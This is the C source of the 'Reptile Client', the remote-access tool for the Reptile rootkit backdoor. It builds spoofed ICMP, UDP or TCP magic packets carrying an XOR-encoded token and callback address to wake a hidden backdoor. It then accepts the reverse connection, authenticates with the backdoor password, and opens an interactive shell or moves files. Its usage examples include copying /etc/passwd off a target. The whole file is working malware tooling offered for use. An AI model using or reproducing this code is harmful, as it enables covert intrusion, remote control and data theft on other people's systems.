/* Reptile Client 
 *
 * Description: Client to remote access to Reptile
 * Author: F0rb1dd3n
 *
 * Enjoy! ;)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/wait.h>
#include <errno.h>                                      
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <fcntl.h>

#include "config.h"
#include "pel.h"

unsigned char message[BUFSIZE + 1];
extern char *optarg;
extern int optind;
char *secret = PASS;
char *token = TOKEN;

int sockfd;
pid_t pid;

char good[] = "\e[01;34m[\e[00m+\e[01;34m]\e[00m";
char bad[] = "\e[01;31m[\e[00m-\e[01;31m]\e[00m";
char warn[] = "\e[01;33m[\e[00m!\e[01;33m]\e[00m";

void p_error(char *message) {
   char error_message[129];

   strcpy(error_message, bad);
   strncat(error_message, " Error ", 7); 
   strncat(error_message, message, 93);
   perror(error_message);
   printf("\n\n");
}

void fatal(char *message) {
	p_error(message);
	exit(ERROR);
}

void pel_error(char *s) {
    switch(pel_errno) {
        case PEL_CONN_CLOSED:
            fprintf(stderr, "%s %s: Connection closed.\n", bad, s);
            break;

        case PEL_SYSTEM_ERROR:
            p_error(s);
            break;

        case PEL_WRONG_CHALLENGE:
            fprintf(stderr, "%s %s: Wrong challenge.\n", bad, s);
            break;

        case PEL_BAD_MSG_LENGTH:
            fprintf(stderr, "%s %s: Bad message length.\n", bad, s);
            break;

        case PEL_CORRUPTED_DATA:
            fprintf(stderr, "%s %s: Corrupted data.\n", bad, s);
            break;

        case PEL_UNDEFINED_ERROR:
            fprintf(stderr, "%s %s: No error.\n", bad, s);
            break;

        default:
            fprintf(stderr, "%s %s: Unknown error code.\n", bad, s);
            break;
    }
}

int get_file(int server, char *argv3, char *argv4) {
    char *temp, *pathname;
    int ret, len, fd, total;

    len = strlen(argv3);

    ret = pel_send_msg(server, (unsigned char *) argv3, len);

    if(ret != PEL_SUCCESS) {
        pel_error("pel_send_msg");
        return(ERROR);
    }

    temp = strrchr(argv3, '/');

    if( temp != NULL ) temp++;
    if( temp == NULL ) temp = argv3;

    len = strlen(argv4);

    pathname = (char *) malloc(len + strlen(temp) + 2);

    if(pathname == NULL) {
        p_error("malloc");
        return(ERROR);
    }

    strcpy(pathname, argv4);
    strcpy(pathname + len, "/");
    strcpy(pathname + len + 1, temp);

    fd = creat(pathname, 0644);

    if(fd < 0) {
        p_error("creat");
        return(ERROR);
    }

    free(pathname);

    total = 0;

    while(1) {
        ret = pel_recv_msg(server, message, &len);

        if(ret != PEL_SUCCESS) {
            if(pel_errno == PEL_CONN_CLOSED && total > 0) break;

            pel_error("pel_recv_msg");
            fprintf(stderr, "%s Transfer failed.\n", bad);
            return(ERROR);
        }

        if(write(fd, message, len) != len) {
            p_error("write");
            return(ERROR);
        }

        total += len;

        printf("%d\r", total);
        fflush(stdout);
    }

    printf("%s %d done.\n", good, total);

    return(0);
}

int put_file(int server, char *argv3, char *argv4) {
    char *temp, *pathname;
    int ret, len, fd, total;

    temp = strrchr(argv3, '/');

    if(temp != NULL) temp++;
    if(temp == NULL) temp = argv3;

    len = strlen(argv4);

    pathname = (char *) malloc(len + strlen(temp) + 2);

    if(pathname == NULL) {
        p_error("malloc");
        return(ERROR);
    }

    strcpy(pathname, argv4);
    strcpy(pathname + len, "/");
    strcpy(pathname + len + 1, temp);

    len = strlen(pathname);

    ret = pel_send_msg(server, (unsigned char *) pathname, len);

    if(ret != PEL_SUCCESS) {
        pel_error("pel_send_msg");
        return(ERROR);
    }

    free(pathname);

    fd = open(argv3, O_RDONLY);

    if(fd < 0) {
        p_error("open");
        return(ERROR);
    }

    total = 0;

    while(1) {
        len = read(fd, message, BUFSIZE);

        if(len < 0) {
            p_error("read");
            return(ERROR);
        }

        if(len == 0) {
            break;
        }

        ret = pel_send_msg(server, message, len);

        if(ret != PEL_SUCCESS) {
            pel_error("pel_send_msg");
            fprintf(stderr, "%s Transfer failed.\n", bad);
            return(ERROR);
        }

        total += len;

        printf("%s %d\r", good, total);
        fflush(stdout);
    }

    printf("%s %d done.\n", good, total);
    return(0);
}

int runshell(int server, char *argv2) {
    fd_set rd;
    char *term;
    int ret, len, imf;
    struct winsize ws;
    struct termios tp, tr;

    term = getenv("TERM");

    if(term == NULL) term = "vt100";

    len = strlen(term);

    ret = pel_send_msg(server, (unsigned char *) term, len);

    if(ret != PEL_SUCCESS) {
        pel_error("pel_send_msg");
        return(ERROR);
    }

    imf = 0;

    if(isatty(0)) {
        imf = 1;

        if(ioctl(0, TIOCGWINSZ, &ws) < 0) {
            p_error("ioctl(TIOCGWINSZ)");
            return(ERROR);
        }
    } else {
        ws.ws_row = 25;
        ws.ws_col = 80;
    }

    message[0] = (ws.ws_row >> 8) & 0xFF;
    message[1] = (ws.ws_row     ) & 0xFF;
    message[2] = (ws.ws_col >> 8) & 0xFF;
    message[3] = (ws.ws_col     ) & 0xFF;

    ret = pel_send_msg(server, message, 4);

    if(ret != PEL_SUCCESS) {
        pel_error("pel_send_msg");
        return(ERROR);
    }

    len = strlen(argv2);
    ret = pel_send_msg(server, (unsigned char *) argv2, len);

    if( ret != PEL_SUCCESS) {
        pel_error("pel_send_msg");
        return(ERROR);
    }

    if(isatty(1)) {
        if(tcgetattr(1, &tp) < 0) {
            p_error("tcgetattr");
            return(ERROR);
        }

        memcpy((void *) &tr, (void *) &tp, sizeof(tr));

        tr.c_iflag |= IGNPAR;
        tr.c_iflag &= ~(ISTRIP|INLCR|IGNCR|ICRNL|IXON|IXANY|IXOFF);
        tr.c_lflag &= ~(ISIG|ICANON|ECHO|ECHOE|ECHOK|ECHONL|IEXTEN);
        tr.c_oflag &= ~OPOST;

        tr.c_cc[VMIN]  = 1;
        tr.c_cc[VTIME] = 0;

        if(tcsetattr(1, TCSADRAIN, &tr) < 0) {
            p_error("tcsetattr");
            return(ERROR);
        }
    }

    while(1) {
        FD_ZERO(&rd);

        if(imf != 0) FD_SET(0, &rd);
        
        FD_SET(server, &rd);

        if(select(server + 1, &rd, NULL, NULL, NULL) < 0) {
            p_error("select");
            ret = 28;
            break;
        }

        if(FD_ISSET(server, &rd)) {
            ret = pel_recv_msg(server, message, &len);

            if(ret != PEL_SUCCESS) {
                if(pel_errno == PEL_CONN_CLOSED) {
                    ret = 0;
                } else {
                    pel_error("pel_recv_msg");
                    ret = 29;
                }
                break;
            }

            if(write(1, message, len) != len) {
                p_error("write");
                ret = 30;
                break;
            }
        }

        if(imf != 0 && FD_ISSET(0, &rd)) {
            len = read(0, message, BUFSIZE);

            if(len == 0) {
                fprintf(stderr, "stdin: end-of-file\n");
                ret = 31;
                break;
            }

            if(len < 0) {
                p_error("read");
                ret = 32;
                break;
            }

            ret = pel_send_msg(server, message, len);

            if(ret != PEL_SUCCESS) {
                pel_error("pel_send_msg");
                ret = 33;
                break;
            }
        }
    }

    if(isatty(1)) tcsetattr(1, TCSADRAIN, &tp);

    return(ret);
}

void handle_shutdown(int signal){
	close(sockfd);
	exit(signal);
}

void sig_quit(int signal) {
	if(signal == SIGQUIT) exit(signal);
}

void s_xor(char *arg, int key, int nbytes) {
	int i;
	for(i = 0; i < nbytes; i++) arg[i] ^= key;
}

unsigned short csum(unsigned short *buf, int nwords) {
        unsigned long sum;
        for(sum=0; nwords>0; nwords--)
                sum += *buf++;
        sum = (sum >> 16) + (sum &0xffff);
        sum += (sum >> 16);
        return ~sum;
}

void icmp(char *srcip, char *dstip, char *data) {
        int                     sockicmp;
        unsigned int            nbytes, seq = 0;
        char                    buffer[128];
        struct iphdr            *iph;
        struct icmp             *icmph;
        struct sockaddr_in      s;
        socklen_t               optval = 1;

        memset(buffer, 0, sizeof(buffer));

        iph = (struct iphdr *) buffer;
        icmph = (struct icmp *) (buffer + sizeof(struct iphdr));

        if((sockicmp = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) fatal("in creating raw ICMP socket");

        if(setsockopt(sockicmp, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1) fatal("in setsockopt");

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->id = htons(getpid());    
        iph->ttl = 255;                
        iph->protocol = IPPROTO_ICMP; 
        iph->saddr = inet_addr(srcip);
        iph->daddr = inet_addr(dstip);

        icmph->icmp_type = 8;            
        icmph->icmp_code = ICMP_ECHO;   
        icmph->icmp_id = getpid();
        icmph->icmp_seq = seq++;

        memcpy(icmph->icmp_data, data, strlen(data));

        iph->tot_len = (sizeof(struct iphdr) + sizeof(struct icmp) + strlen(data) + 1);

        icmph->icmp_cksum = csum((unsigned short *) icmph, sizeof(struct icmp) + strlen(data) + 1);
        iph->check = csum((unsigned short *) iph, sizeof(struct iphdr));

        s.sin_family = AF_INET;
        s.sin_addr.s_addr = inet_addr(dstip);

        if((nbytes = sendto(sockicmp, buffer, iph->tot_len, 0, (struct sockaddr *) &s, sizeof(struct sockaddr))) == 0) fatal("on sending package");

        printf("%s ICMP: %u bytes sent\n", good, nbytes);
        close(sockicmp);
}

void udp(char *srcip, char *dstip, unsigned int srcport, unsigned int dstport, char *data)
{
        int                     sockudp;
        unsigned int            nbytes, pckt_tam;
        char                    *buffer;
        struct iphdr            *iph;
        struct udphdr           *udph;
        struct sockaddr_in      s;
        socklen_t               optval = 1;

        pckt_tam = sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(data);
        
	if(!(buffer = (char *) malloc(pckt_tam))) fatal("on allocating buffer memory");

        iph = (struct iphdr *) buffer;
        udph = (struct udphdr *) (buffer + sizeof(struct iphdr));
        
        memset(buffer, 0, pckt_tam);

        if((sockudp = socket(PF_INET, SOCK_RAW, IPPROTO_UDP)) == -1) fatal("on creating UDP socket");
	
        if(setsockopt(sockudp, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1) fatal("on setsockopt");
	
	memcpy((buffer + sizeof(struct iphdr) + sizeof(struct udphdr)), data, strlen(data));

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->id = htons(getpid());
        iph->ttl = 255;
        iph->protocol = IPPROTO_UDP;
        iph->tot_len = pckt_tam + 1;
        iph->saddr = inet_addr(srcip);
        iph->daddr = inet_addr(dstip);

        udph->source = htons(srcport);
        udph->dest = htons(dstport);
        udph->len = htons(sizeof(struct udphdr) + strlen(data));
        
	udph->check = csum((unsigned short *) udph, sizeof(struct udphdr) + strlen(data));
        iph->check = csum((unsigned short *) iph, sizeof(struct iphdr));

        s.sin_family = AF_INET;
        s.sin_port = htons(dstport);
        s.sin_addr.s_addr = inet_addr(dstip);

        if((nbytes = sendto(sockudp, buffer, iph->tot_len, 0, (struct sockaddr *) &s, sizeof(struct sockaddr))) == 0) fatal("on sending package");

        printf("%s UDP: %u bytes was sent\n", good, nbytes);
        close(sockudp);
}

void tcp(char *srcip, char *dstip, unsigned int srcport, unsigned int dstport, char *data)
{
        int                     socktcp;
        unsigned int            nbytes, pckt_tam;
        char                    *buffer;
        struct iphdr            *iph;
        struct tcphdr           *tcph;
        struct sockaddr_in      s;
        socklen_t               optval = 1;

        pckt_tam = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
        
	if(!(buffer = (char *) malloc(pckt_tam))) fatal("on allocating buffer memory");

        iph = (struct iphdr *) buffer;
        tcph = (struct tcphdr *) (buffer + sizeof(struct iphdr));
        
        memset(buffer, 0, pckt_tam);

        if((socktcp = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) fatal("on creating TCP socket");
	
        if(setsockopt(socktcp, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1) fatal("on setsockopt");
	
	memcpy((buffer + sizeof(struct iphdr) + sizeof(struct tcphdr)), data, strlen(data));

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->id = htons(getpid());
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->tot_len = pckt_tam + 1;
        iph->saddr = inet_addr(srcip);
        iph->daddr = inet_addr(dstip);

    	tcph->source = htons(srcport);
        tcph->dest = htons(dstport);
     
    	tcph->seq = 0;
    	tcph->ack_seq = 0;
    	tcph->doff = 5;
    	tcph->fin=0;
    	tcph->syn=1;
    	tcph->rst=0;
    	tcph->psh=0;
    	tcph->ack=0;
    	tcph->urg=0;
    	tcph->window = htons (5840);
    	tcph->urg_ptr = 0;
       
	tcph->check = csum((unsigned short *) tcph, sizeof(struct tcphdr) + strlen(data));
        iph->check = csum((unsigned short *) iph, sizeof(struct iphdr));

        s.sin_family = AF_INET;
        s.sin_port = htons(dstport);
        s.sin_addr.s_addr = inet_addr(dstip);

        if((nbytes = sendto(socktcp, buffer, iph->tot_len, 0, (struct sockaddr *) &s, sizeof(struct sockaddr))) == 0) fatal("on sending package");

        printf("%s TCP: %u bytes was sent\n", good, nbytes);
        close(socktcp);
}

void usage(char *argv){
	printf("\n\e[01;36mReptile Client\e[00m\n");
	printf("\e[01;32mWritten by: F0rb1dd3n\e[00m\n");
	printf("\nUsage: %s [options]\n\n", argv);
	printf("-t Target\n");
	printf("-a Action:\n\n");
	printf(" <cmd>                       \trun command\n");
	printf(" get <source-file> <dest-dir>\tdownload a file\n");
	printf(" put <source-file> <dest-dir>\tupload a file\n\n");
	printf("%s If action is nothing specified, open a shell!\n\n", warn);
	printf("-x\tMagic Packet protocol (ICMP/UDP/TCP) or just \"listen\"\n");
	printf("-s\tSource IP address if you wanna spoof\n");
	printf("-l\tLocal host to reverse shell\n");
	printf("-p\tLocal port to reverse shell\n");
	printf("-k\tToken to trigger the port-knocking\n");
	printf("-w\tPassword for backdoor auth\n\n");
	printf("%s ICMP doesn't need ports\n\n", warn);
	printf("Example: %s -t 192.168.0.3 -x tcp -s 192.168.0.2 -l 192.168.0.4 -p 4444 -w s3cr3t -k hax0r\n", argv);
	printf("Example: %s -t 192.168.0.3 -a \"get /etc/passwd /tmp\" -x udp -l 192.168.0.4 -p 4444\"\n\n", argv);
	exit(1);
}

int main(int argc, char **argv) {
        char *srcip, *dstip, *buf, *prot, *lport, *lhost, *data; 
	char *password, *src_file, *dst_dir, *cmd, action = RUNSHELL; 
        int opt, ret, new_sockfd, yes = 1;  
	struct sockaddr_in host_addr, client_addr;
	socklen_t sin_size;

        lhost = lport = src_file = dst_dir = srcip = dstip = prot = buf = cmd = data = NULL;
 
        while((opt = getopt(argc, argv, "a:s:t:l:p:x:w:")) != EOF) {
                switch(opt) {
                        case 'x':
                                prot = optarg;
				if(!strcmp(prot, "icmp")){
					if(!strcmp(prot, "udp")) {
						if(!strcmp(prot, "tcp")) {
							if(!strcmp(prot, "listen")) {
								printf("%s wrong protocol\n", bad);
	       							exit(-1);
							}
						}
					}
				}
                                break;
                        case 's':
                                if(strlen(optarg) > 15) {
                                        printf("%s wrong IP address\n", bad);
                                        exit(-1);
                                }
                                srcip = optarg; 
                                break;
			case 't':
                                if(strlen(optarg) > 15) {
                                        printf("%s wrong IP address\n", bad);
                                        exit(-1);
                                }
                                dstip = optarg;
                                break;
                        case 'l':
                                if(strlen(optarg) > 15) {
                                        printf("%s wrong IP address\n", bad);
					exit(-1);   
                                }
                                lhost = optarg;
                                break;
			case 'p':
				if(atoi(optarg) < 0 || atoi(optarg) > 65535){
                                        printf("%s wrong port\n", bad);
					exit(-1);
				}
				lport = optarg;
				break;
			case 'a':
    				if(strstr(optarg, "get") != NULL) {
	       				action = GET_FILE;
					src_file = strtok(optarg, " ");
					src_file = strtok(NULL, " ");
					dst_dir = strtok(NULL, " ");
				} else if(strstr(optarg, "put") != NULL) {
	       				action = PUT_FILE;
					src_file = strtok(optarg, " ");
					src_file = strtok(NULL, " ");
					dst_dir = strtok(NULL, " ");
				} else {
					cmd = optarg;
				}
				break;
			case 'w':
				secret = optarg;
				break;
			case 'k':
				token = optarg;
				break;
                        default: 
                                usage(argv[0]);
                                break;
                }
        }
    	argv+=(optind-1);
   	argc-=(optind-1);

	password = NULL;
    	
	if(lport == NULL || lhost == NULL || dstip == NULL || prot == NULL) usage(argv[0]);
	if(srcip == NULL) srcip = strdup(lhost);

	system("clear");
	printf("\n\e[01;36mReptile Client\e[00m\n");
	printf("\e[01;32mWritten by: F0rb1dd3n\e[00m\n\n");
	printf("\e[01;31mFinish him!!!\e[00m\n\n");

	if(strcmp(prot, "listen")) {
		data = (char *) malloc(strlen(TOKEN) + strlen(lhost) + strlen(lport) + 4);
		strcpy(data, token);
		strcat(data, " ");
		strcat(data, lhost);
		strcat(data, " ");
		strcat(data, lport);
		strcat(data, " ");

		printf("%s Data: %s\n", good, data);
		s_xor(data, 11, strlen(data));
		printf("%s Encoded data: %s\n", good, data);		
        
		if(action == GET_FILE) printf("%s Download %s -> %s\n", good, src_file, dst_dir);
        	if(action == PUT_FILE) printf("%s Upload %s -> %s\n", good, src_file, dst_dir);
        	if(cmd != NULL) printf("%s Run command: \"%s\"\n", good, cmd);
	
		signal(SIGQUIT, sig_quit);
	}

	pid = fork();
	
	if(pid == -1) fatal("on forking proccess");

	if(pid > 0) {
		signal(SIGQUIT, SIG_DFL);

		if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) fatal("in socket");
		if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) fatal("setting socket option SO_REUSEADDR");

		signal(SIGTERM, handle_shutdown);
		signal(SIGINT, handle_shutdown);
	
		host_addr.sin_family = AF_INET;		
		host_addr.sin_port = htons(atoi(lport));	        
		host_addr.sin_addr.s_addr = INADDR_ANY; 
		memset(&(host_addr.sin_zero), '\0', 8); 

		if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)	fatal("binding to socket");

		if (listen(sockfd, 5) == -1) {
			fatal("listening on socket");
		} else {
			printf("%s Listening on port %d...\n", good, atoi(lport));
		}

		sin_size = sizeof(struct sockaddr_in);
		new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
	
		if(new_sockfd == -1) fatal("accepting connection");

		fprintf(stdout, "%s Connection from %s:%d\n", good, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
		kill(pid, SIGQUIT); // telling child to stop sending packets, cause we received the fucking connection
		usleep(100*1500);

		if(password == NULL) {
        		ret = pel_client_init(new_sockfd, secret);

        		if(ret != PEL_SUCCESS) {
            			close(new_sockfd);
				printf("%s wrong password!\n\n", bad);
            			exit(ERROR);
        		}
    		} else {
        		ret = pel_client_init(new_sockfd, password);
        		memset(password, 0, strlen(password));

        		if(ret != PEL_SUCCESS){
            			shutdown(new_sockfd, 2);
        			fatal("Authentication failed!");
			}

    		}

    		ret = pel_send_msg(new_sockfd, (unsigned char *) &action, 1);

    		if(ret != PEL_SUCCESS) {
        		pel_error("pel_send_msg");
        		shutdown(new_sockfd, 2);
    			exit(ERROR);
		}

    		switch(action) {
        		case GET_FILE:
				ret = get_file(new_sockfd, src_file, dst_dir);
            			break;
        		case PUT_FILE:
            			ret = put_file(new_sockfd, src_file, dst_dir);
            			break;
        		case RUNSHELL:
            			printf("\n");
				ret = ((cmd != NULL)
                		? runshell(new_sockfd, cmd)
                		: runshell(new_sockfd, "exec bash --rcfile " RCFILE));
            			break;
			default:
            			ret = -1;
            			break;
    		}
		shutdown(new_sockfd, SHUT_RDWR);
		close(sockfd);
		return ret;
	}

	if(pid == 0 && strcmp(prot, "listen")){
		usleep(100*1500);
		while(1){
        		if(!strcmp(prot, "icmp")) {
				icmp(srcip, dstip, data);
        		} else if(!strcmp(prot, "udp")) {
                		udp(srcip, dstip, SRCPORT, UDPPORT, data);
        		} else if(!strcmp(prot, "tcp")) {
                		tcp(srcip, dstip, SRCPORT, TCPPORT, data);
        		}
			sleep(1);
			printf("%s Retry in 1 second...\n", warn);
			sleep(1);
		}
	}

	return EXIT_SUCCESS;
}
